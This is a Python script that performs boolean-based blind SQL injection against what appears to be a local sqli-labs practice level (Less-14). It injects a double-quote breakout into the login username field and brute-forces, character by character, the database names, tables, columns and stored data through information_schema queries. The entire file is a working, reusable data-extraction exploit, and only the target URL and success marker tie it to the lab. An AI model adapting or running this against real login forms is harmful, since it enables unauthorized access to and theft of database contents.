import requests as req
from time import sleep
from utils.standardHeaders import standardHeader
from utils.normal import sqlForce

baseurl = 'http://127.0.0.1:81/Less-14/'
# less13:')  less14:"
poc = '\"'
postData = {
    'uname': 'admin'+poc,
    'passwd': '1',
    'submit': 'Submit'
}


def post(url, header=standardHeader, data=postData):
    res = req.post(url, headers=header, data=data)
    return res


def checkRes(res, okText):
    if okText in res:
        return True
    else:
        return False


def forceDatabases(pocUrl, okText):
    payload = "(select group_concat(schema_name) from information_schema.schemata)"
    print("Forcing database length")
    for databaseConcatLength in range(50,9999):
        expData = {'passwd': '1', 'submit': 'Submit',
                   'uname': postData['uname'] + ' and length({})>{} -- -'.format(payload, str(databaseConcatLength))}
        res = post(baseurl, data=expData)
        if not checkRes(res.text, okText):
            print("Database length is {}\nForcing each char".format(databaseConcatLength))
            allDatabases = ''
            payload = "and ascii(substr(" + payload + ",{},1))={} -- -"
            for index in range(1,databaseConcatLength+1):
                for char in sqlForce:
                    expData = {'passwd': '1', 'submit': 'Submit',
                               'uname': postData['uname'] + payload.format(str(index), ord(char))}
                    res = post(baseurl, data=expData)
                    if checkRes(res.text, okText):
                        allDatabases = allDatabases + char
                        print(allDatabases)
                        break
            return allDatabases


def forceTables(pocUrl, database, okText):
    payload = "(select group_concat(table_name) from information_schema.tables where table_schema=\'{}\')".format(database)
    print("Forcing all tables' length")
    for tableConcatLength in range(1, 9999):
        expData = {'passwd': '1', 'submit': 'Submit',
                   'uname': postData['uname'] + ' and length({})>{} -- -'.format(payload, str(tableConcatLength))}
        res = post(baseurl, data=expData)
        if not checkRes(res.text, okText):
            print("table length is {}\nForcing each char".format(tableConcatLength))
            allTables = ''
            payload = "and ascii(substr(" + payload + ",{},1))={} -- -"
            for index in range(1, tableConcatLength+1):
                for char in sqlForce:
                    expData = {'passwd': '1', 'submit': 'Submit',
                               'uname': postData['uname'] + payload.format(str(index), ord(char))}
                    res = post(baseurl, data=expData)
                    if checkRes(res.text, okText):
                        allTables = allTables + char
                        print(allTables)
                        break
            return allTables


def forceColumns(pocUrl, table, okText):
    payload = "(select group_concat(column_name) from information_schema.columns where table_name='{}')".format(table)
    print("Forcing all columns' length")
    for columnConcatLength in range(1, 9999):
        expData = {'passwd': '1', 'submit': 'Submit',
                   'uname': postData['uname'] + ' and length({})>{} -- -'.format(payload, str(columnConcatLength))}
        res = post(baseurl, data=expData)
        if not checkRes(res.text, okText):
            print("columns length is {}\nForcing each char".format(columnConcatLength))
            allColumns = ''
            payload = "and ascii(substr(" + payload + ",{},1))={} -- -"
            for index in range(1, columnConcatLength+1):
                for char in sqlForce:
                    expData = {'passwd': '1', 'submit': 'Submit',
                               'uname': postData['uname'] + payload.format(str(index), ord(char))}
                    res = post(baseurl, data=expData)
                    if checkRes(res.text, okText):
                        allColumns = allColumns + char
                        print(allColumns)
                        break
            return allColumns


def dumpData(pocUrl, okText, database, table, column='*'):
    payload = "(select group_concat({}) from {}.{})".format(column, database, table)
    print("Forcing all data's length")
    for dataConcatLength in range(1, 9999):
        expData = {'passwd': '1', 'submit': 'Submit',
                   'uname': postData['uname'] + ' and length({})>{} -- -'.format(payload, str(dataConcatLength))}
        res = post(baseurl, data=expData)
        if not checkRes(res.text, okText):
            print("data length is {}\nForcing each char".format(dataConcatLength))
            allData = ''
            payload = "and ascii(substr(" + payload + ",{},1))={} -- -"
            for index in range(1, dataConcatLength+1):
                for char in sqlForce:
                    expData = {'passwd': '1', 'submit': 'Submit',
                               'uname': postData['uname'] + payload.format(str(index), ord(char))}
                    res = post(baseurl, data=expData)
                    if checkRes(res.text, okText):
                        allData = allData + char
                        print(allData)
                        break
            return allData


if __name__ == '__main__':
    okText = 'flag.jpg'
    res = post(baseurl)
    databases = forceDatabases(baseurl, okText)
    print('Input a database to force all tables:')
    database = input()
    tables = forceTables(baseurl, database, okText)
    print('Input a table to force all columns:')
    table = input()
    columns = forceColumns(baseurl, table, okText)
    print('Input a column to force all data:')
    dumpColumn = input()
    data1 = dumpData(baseurl, okText, database=database, table=table, column=dumpColumn)
    print(data1)
